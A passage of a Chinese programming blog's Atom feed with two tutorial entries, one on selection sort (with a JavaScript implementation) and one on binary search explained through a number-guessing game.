href="https://baike.baidu.com/item/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/9762418">选择排序（Selection sort）</a>是一种简单直观的排序算法。它的工作原理是：第一次从待排序的数据元素中选出最小（或最大）的一个元素，存放在序列的起始位置，然后再从剩余的未排序元素中寻找到最小（大）元素，然后放到已排序的序列的末尾。以此类推，直到全部待排序的数据元素的个数为零。选择排序是不稳定的排序方法</p></blockquote><h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕</p><h3 id="具体实现过程"><a href="#具体实现过程" class="headerlink" title="具体实现过程"></a>具体实现过程</h3><p>有没有思考过对一组数进行排序时的过程是怎样的</p><p>比如要对【1，3，9，5，2】数组进行排序</p><ol><li>我们首先在原数组内进行比较，找出最大值，结果是9，所以我们把他放到新建数组第一个位置【9】</li><li>接着在剩下的数组遍历找出最大的值，是5，放到新数组第二个位置【9，5】</li><li>继续对剩下的三个数字进行同样操作【1，3，2】，得出最终结果【9，5，3，2，1】</li></ol><p>这便是选择排序的过程，一共需要几步呢上面，每次都对原数组进行比较排序，需要进行5趟比较，每趟比较又是和另外几个数的比较，也是5次，所以最终的所需的步数是25，也就是n²</p><blockquote><p>随着排序的进行，每次需要检查的元素数在逐渐减少，最后一次需要检查的元素都只有一 个。既然如此，运行时间怎么还是O(n² )呢</p><p>确实，并非每次都需要检查n个元素。第一次需要检查n个元素，但随后检查的元素 数依次为n - 1, n – 2, …, 2和1。平均每次检查的元素数为1/2 × n，因此运行时间为O(n × 1/2 × n)。 但<strong>大O表示法省略诸如1/2这样的常数</strong></p></blockquote><h2 id="选择排序实例代码"><a href="#选择排序实例代码" class="headerlink" title="选择排序实例代码"></a>选择排序实例代码</h2><ol><li><p>数组内比较使用一个函数max进行最大值获取，对数组内每个值进行遍历，找出最大值的索引，具体思路如下</p><blockquote><p>使用变量存储最大值以及最大值索引，给其赋初始值，即为数组第一个数据，接着对数组内数据进行遍历，若遍历到的数据比当前数值大，即将当前变量赋值为它，不断执行该操作，直到遍历完返回该数值索引</p></blockquote></li><li><p>对数组进行排序sort的主函数，使用新数组进行存储排序后的值，接着对原数组进行遍历和最大值查找，找出一个便在原数组删除该数据，避免引起无限循环导致内存泄漏，重复执行，直到最终结果出来</p></li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/12/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F/%E9%80%89%E6%8B%A9%E6%8E%92%E5%BA%8F.png" alt="选择排序"></p><h3 id="优化版"><a href="#优化版" class="headerlink" title="优化版"></a>优化版</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">selectSort</span>(<span class="params">arr</span>) &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">swap</span>(<span class="params">index1, index2</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> temp = arr[index1];</span><br><span class="line">    arr[index1] = arr[index2];</span><br><span class="line">    arr[index2] = temp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; arr.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> minIndex = i;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = i + <span class="number">1</span>; j &lt; arr.<span class="property">length</span>; j++) &#123;</span><br><span class="line">      arr[minIndex] &gt; arr[j] &amp;&amp; (minIndex = j);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_">swap</span>(minIndex, i);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      一种简单直观的排序算法
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>二分法</title>
    <link href="http://dong-666.github.io/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/"/>
    <id>http://dong-666.github.io/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/</id>
    <published>2021-08-01T08:00:00.000Z</published>
    <updated>2022-03-02T07:59:54.196Z</updated>
    
    <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote><p>二分查找也称折半查找（Binary Search），它是一种效率较高的查找方法。但是，折半查找要求线性表必须采用顺序存储结构，而且表中元素按关键字有序排列。</p></blockquote><h2 id="算法过程"><a href="#算法过程" class="headerlink" title="算法过程"></a>算法过程</h2><p>首先，假设表中元素是按升序排列，将表中间位置记录的关键字与查找关键字比较，如果两者相等，则查找成功；否则利用中间位置记录将表分成前、后两个子表，如果中间位置记录的关键字大于查找关键字，则进一步查找前一子表，否则进一步查找后一子表。重复以上过程，直到找到满足条件的记录，使查找成功，或直到子表不存在为止，此时查找不成功</p><h2 id="简单查找"><a href="#简单查找" class="headerlink" title="简单查找"></a>简单查找</h2><p>我们在日常生活中经常会玩一个游戏：找数字</p><p>提问者给出该数字的范围，然后回答者根据这个范围进行猜数，如果比正确答案大，提问者便会说大了，如若小了，则提问者回答小了，直至猜出正确答案</p><p>比如：提问者随便想出一个数字-57，范围是0-100，回答者开始猜，如下图</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829090857846.png" alt="算法图解-简单查找"></p><p>等到他猜到57，便成功猜到正确答案了，这便是简单查找，回答者一个一个说，直到正确答案出来</p><h2 id="二分查找"><a href="#二分查找" class="headerlink" title="二分查找"></a>二分查找</h2><p>更简单的查找方式，根据方法名即可猜到，将猜测范围一分为二，比如0-100，那么你猜50，无论是大了还是小了，你立即就可以排除掉一半的数字，接着重复一分为二的操作进行猜数，最后得出正确答案</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091346823.png" alt="image-20210829091346823"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091357416.png" alt="image-20210829091357416"></p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091407604.png" alt="image-20210829091407604"></p><p>梳理下这个猜数的过程，我们一共进行了几步</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829091706567.png" alt="image-20210829091706567"></p><p>回过头去，如果你采用暴力式简单查找，那么你猜的数字便是n（答案n）步，如果目标数字小，还好，如果是99呢，你就得猜到99才能猜到</p><p>引用书籍的另一个例子——</p><blockquote><p>假设你要在字典中查找一个单词，而该字典包含240 000个单词， 你认为每种查找最多需要多少步？ 如果要查找的单词位于字典末尾，使用简单查找将需要240 000步。使用二分查找时，每次排除一半单词，直到最后只剩下一个单词。</p></blockquote><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/image-20210829092007999.png" alt="image-20210829092007999"></p><p>可见，随着要猜的范围越来越大，二分查找的优势也越加凸显，而二分查找所需的步数也符合对数的规律</p><blockquote><p>二分查找最多需要log2n步</p></blockquote><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><h3 id="简单查找-1"><a href="#简单查找-1" class="headerlink" title="简单查找"></a>简单查找</h3><p>我们首先看简单查找的代码实现（这里包括后面只会给出图片格式的代码，因为更多的希望通过实操去理解每个算法的过程）</p><p>直接通过遍历，一个一个判断，最后返回结果</p><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/%E7%AE%80%E5%8D%95%E6%9F%A5%E6%89%BE.png" alt></p><h3 id="二分查找-1"><a href="#二分查找-1" class="headerlink" title="二分查找"></a>二分查找</h3><p>看看二分查找的实现代码（因为是根据自己的理解所写，所以多多少少可能会有不合理的地方，望指出）</p><ol><li>首先是写一个回答函数，相当于提问者的回答，传入参数包括回答者的数字和正确的数字</li><li>接着便是使用二分法进行猜数，每次猜中间数，对了返回，不对就根据情况进行数组裁剪，裁剪完继续重复该函数（递归思想）</li></ol><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2021/08/01/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE/%E4%BA%8C%E5%88%86%E6%9F%A5%E6%89%BE.png" alt="二分查找"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>O(log n)比O(n)快（也就是二分法比简单查找快），当需要搜索的元素越多时，前者比后者快得越多</p></blockquote>]]></content>
    
    <summary type="html">
    
      二分查找也称折半查找（Binary Search），它是一种效率较高的查找方法
    
    </summary>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/categories/%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="算法" scheme="http://Dong-666.github.io/tags/%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
</feed>
